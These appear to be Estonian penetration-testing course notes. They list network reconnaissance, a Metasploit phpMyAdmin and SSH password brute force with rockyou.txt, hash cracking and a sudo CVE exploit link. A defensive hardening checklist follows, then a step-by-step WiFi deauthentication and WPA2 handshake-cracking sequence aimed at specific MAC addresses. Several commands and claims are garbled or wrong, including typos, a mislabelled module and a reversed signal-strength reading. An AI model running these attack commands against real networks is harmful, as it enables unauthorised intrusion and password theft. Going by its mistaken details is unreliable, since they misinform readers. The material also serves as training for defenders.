pentestgpt.ai?
pfSense eeldab, et esimeses adapteris on internet ja teises oma VLAN

FIX https://github.com/kh4sh3i/CVE-2025-32463.git
Vulnerable: sudo 1.9.14 to 1.9.17
Patched: sudo 1.9.17p1 and later
apt update && apt install sudo
reboot

NMAP / ZENMAP(visuaalne) on võrgu skännimiseks ja on väga lärmakas ning tõmbab täis võrgulogid (cisco healthcheck jääb seisma).
Selle kasutamiseks on vaja võrgu omaniku luba kuna pole standard tarkvara.
sudo nmap -sV -O 192.168.1.0/24

Kui on väga vaja SSH-d väljast siis tee port knocking. Standard on VPN > ssh

Kõigepealt skännime võrku
Leiame pordid/teenused
Leiame versioonid (whatweb <ip>)
Leiame kõik välja ulatuvad failid (dirsearch -u <ip/url>)
Leiame nõrkused (näiteks wp-admin ning proovime mis kasutajad eksisteerivad)
Proovime rünnata kõige suurema tasuga ja kõige väiksema riskiga süsteemi (näiteks php)
  msfconsole use auxiliary/scanner/http/phpmyadmin_login
    #--------wordpress bruteforce------------
    set rhost <ip>
    set targeturi /phpmyadmin/index.php
    exho root >> /tmp/user.txt
    set user_file /tmp/user.txt
    set pass_file /home/user/Documents/rockyou.txt
    run (see käsk teeb sind kriminaaliks)
  hashcat 'leitudhash' /word/list/location.txt.gz
  #------------SSH----------------
  use auxiliary/scanner/ssh/ssh_login

Loo dokument kuidas fixida kõik kolm rünnakut

0. Värskenda süsteemid viimaste turvauuendustega (seadista automaatsed uuendused kui on võimalik)
1. Hoia süsteem lihtsana ja hallatavana. Väldi liigseid pluginaid. KISS (Keep it simple, stupid)
2. Kasuta tulemüüri ning whitelisti nende portide jaoks mida reaalselt kasutad. Paigalda WAF (web application firewall)
3. Kasuta default portide (ssh:22 näiteks) asemel mingit muud porti, et numbrist ei oleks kohe näha mis teenusega tegu
4. Piira portidel liikluse kiirust
5. Kasuta port knockingut
6. Eralda teenused võrgu tasemel
7. Blokeeri WhatWeb user-agent tulemüüris ja/või veebi serveri confis
8. CAPTCHA võib aidata WhatWebi vastu
9. Seadista (veebiserveri) logimine ja nende põhjal teavitused (mida keegi vaatab ka)
10. Piira päringute kiirust
11. Seadista veebiserver selliselt, et vea korral oleks ühtlane 404 vastus, et ei oleks erinevad lehed eristatavad
12. Ära hoia veebiserveril faile mis ei peaks seal oleama
13. Kasuta autentimist kus vähegi võimalik
14. Keela veebirakendusel ära kasutajatel kaustapuu surfamise märkide kasutamine (/)
15. Kasuta tugevaid paroole
16. Kasuta MFAd
17. Muuda sisse logimise veebilehe nime, et vältida automaatikat (index.php, wp-admin.php)


NB! Flipper võib segada elupäästvaid süsteeme (südameaparaadid jne)
WIFI seadmes väldi settingut WPA2/WPA3. WPA2 on ebaturvaline.
WIFI kaameraid ei tasu kasutada (laser aitab peaaegu alati)

Monitor mode (Realtek, Intel~, Broadcom~~,Bluedragon~~~ kiibid) on eelduseks järgnevaks ülesandeks + WPA2
iwconfig
sudo ifconfig wlan0 down - Katkestame wifi ühenduse
sudo airmon-ng check kill - tapab ära WIFI peal toimivad teenused (näiteks NetworkManager)
sudo airmon-ng start wlan0 - lülitame monitor mode sisse (jälgib kõike liiklust)
iwconfig - kinnita monitor mode. wlan0mon peab olema nähtav
sudo airoman-ng --band abg wlan0mon - kuulame ja dumpime monitooringu sisu (PWR mida suurem number seda kaugemal seade)
sudo airodump-ng --bssid E8:DE:27:B0:66:72 --channel 11 wlan0mon --write nimi (scannime APd kindlal kanalil, et näha küljes olevaid kliente ning kirjutame outputi)
sudo aireplay-ng --deauth 60 -a E8:DE:27:B0:66:72 -c 70:8C:F2:B3:28:D7 wlan0mon (peksame välja kliendi määratud ajaks,et koguda handshake)
sudo aircrack-ng hack-01.cap -w rockyou.txt (crackime wifi parooli)
sudo reaver --bssid E8:DE:27:B0:66:72 --channel 11 --interface wlan0mon -vvv -no-associate (nagu eelmine aga teine tool mis crackib ise aga eeldab, et kogume samal ajal handshake)
sudo airmon-ng stop wlan0mon (enable station mode, disable monitor mode)
sudo service NetworkManager restart (taasta võrguteenus)

ARP - Address Resolution Protocol


